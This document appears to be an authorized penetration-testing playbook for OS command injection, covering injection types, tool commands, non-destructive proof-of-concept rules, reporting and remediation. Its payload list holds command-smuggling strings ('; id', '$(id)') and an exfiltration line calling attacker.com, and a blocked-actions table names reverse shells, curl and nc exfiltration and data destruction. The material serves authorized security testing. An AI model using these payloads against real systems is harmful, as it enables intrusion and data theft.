# Command Injection — Playbook

## Vulnerability Description

**OWASP:** A03:2021 — Injection
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

Command Injection occurs when an application passes unsafe user-supplied data to a system shell. An attacker can execute arbitrary operating system commands on the host, leading to full server compromise, data exfiltration, lateral movement, or persistent backdoors.

---

## Types

| Type | Description | Detection Method |
|---|---|---|
| **Direct injection** | Command output is reflected in the HTTP response | `; id` → output appears on the page |
| **Blind** | No output is reflected — must infer execution via side effects | `; sleep 5` → response delay |
| **Time-based (blind)** | Use timing to confirm injection | `; sleep 5`, `| ping -c 5 127.0.0.1` |
| **Error-based (blind)** | Force a command that writes to stderr | `; ls /nonexistent` → error differences |

---

## Detection

### Manual Payloads

```bash
# Linux / Unix targets
; id
| id
&& id
|| id
`id`
$(id)
; sleep 5
| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows targets
& ver
| ver
&& ver
& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1

# Output capture (blind)
; echo test_injected
| echo test_injected
&& echo test_injected

# Target-side redirect to an accessible temporary file (blind)
; echo INJECTED > /tmp/out.txt
; curl http://attacker.com/$(whoami)   # OOB exfil (BLOCKED without explicit approval)
```

### Testing Locations

- Ping / traceroute / nslookup tools (web interfaces)
- Hostname / whoami / uname display features
- Download / fetch / wget / curl URL fields
- DNS lookup utilities
- Log viewing / tail / grep fields
- File path fields that might be passed to shell commands
- Image processing / conversion tools (ImageMagick, ffmpeg)

## Tools

| Tool | Purpose | Notes |
|---|---|---|
| **curl** | Manual payload injection | `curl -G --data-urlencode 'host=;id' 'https://target.com/ping'` |
| **commix** | Automated command injection detection | `commix --url='https://target.com/ping?host=127.0.0.1'` |
| **ffuf** | Parameter fuzzing for injection points | `ffuf -w /usr/share/wordlists/parameters.txt -u 'https://target.com/FUZZ=127.0.0.1'` |

> ⚠️ `commix` may not be installed by default. Install via `pip install commix` or use Kali/Parrot.

## Safe Proof of Concept

Non-destructive payloads that prove command execution:

```bash
# Time-based (blind) — safe, no side effects
; sleep 5

# Echo-based — safe if output is visible
; echo PENTEST_OK

# Whoami (returns username only — no data modification)
; whoami

# Hostname (returns machine hostname — no data modification)
; hostname
```

Proof of concept rules:
- **Never** use destructive commands (`rm`, `dd`, `mkfs`, `chmod -R`)
- **Never** write files to the filesystem outside approved test directories
- **Never** initiate outbound connections (reverse shells, data exfiltration)
- **Never** modify system state (processes, users, cron, services)
- Time-based (`sleep 5`) is the safest universal PoC

## Evidence

Each finding should include:

```
**Vulnerability:** OS Command Injection
**URL:** https://target.com/cgi-bin/ping?host=127.0.0.1
**Parameter:** host
**Payload:** ; sleep 5
**Type:** Blind time-based

**HTTP Request:**
  GET /cgi-bin/ping?host=127.0.0.1%3B+sleep+5 HTTP/1.1
  Host: target.com

**Response time with payload:** 5.03s
**Response time without:** 0.04s
**Baseline:** 0.03s (benign request)

**Confirming payload:** ; echo PENTEST_OK
**Response output:** PENTEST_OK (appended to ping results)

**Remediation:** Avoid passing user input to system shell. Use parameterized APIs.
```

- Screenshots (if applicable) → `$ENG_DIR/evidence/exploitation/screenshots/`
- Request/response pairs → `$ENG_DIR/evidence/exploitation/http/`

## Remediation

| Measure | Description |
|---|---|
| **Avoid `os.system()` / `eval()` / `exec()`** | Never pass user input to shell execution functions. |
| **Use parameterized APIs** | Instead of `os.system("ping " + host)`, use `subprocess.run(["ping", host])` which does not invoke the shell. |
| **Input validation** | Whitelist allowed characters (e.g., IP addresses: digits and dots only). Reject everything else. |
| **Sandboxing / containerization** | Run command-execution functionality in isolated containers with minimal OS footprint. |
| **Disable shell invocation** | Use `subprocess.Popen` with `shell=False` (default). Avoid shell wrappers. |
| **Least privilege** | Application process should run as a non-root user with no write access to system directories. |
| **WAF** | Layer 7 filtering for common command injection payloads (defense-in-depth). |

## Stop Conditions
- Payload causes unexpected server behavior → pause and assess
- Access to sensitive data beyond scope → stop and notify

## Blocked Actions

The following are **never** permitted during authorized testing unless explicitly approved in writing:

| Action | Risk |
|---|---|
| **Reverse shells** | Full remote access to the server |
| **File writes (webshells, cron, authorized_keys)** | Persistence mechanism |
| **Data destruction** | `rm -rf`, `dd if=/dev/zero`, `mkfs` |
| **Data exfiltration** | `curl`, `wget`, `nc` sending data to external hosts |
| **Persistence** | Adding cron jobs, systemd services, SSH keys, startup scripts |
| **Privilege escalation** | `sudo`, `su`, `chmod +s`, kernel exploits |
| **Network scanning from compromised host** | Lateral movement |
| **Modifying system files** | `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` |
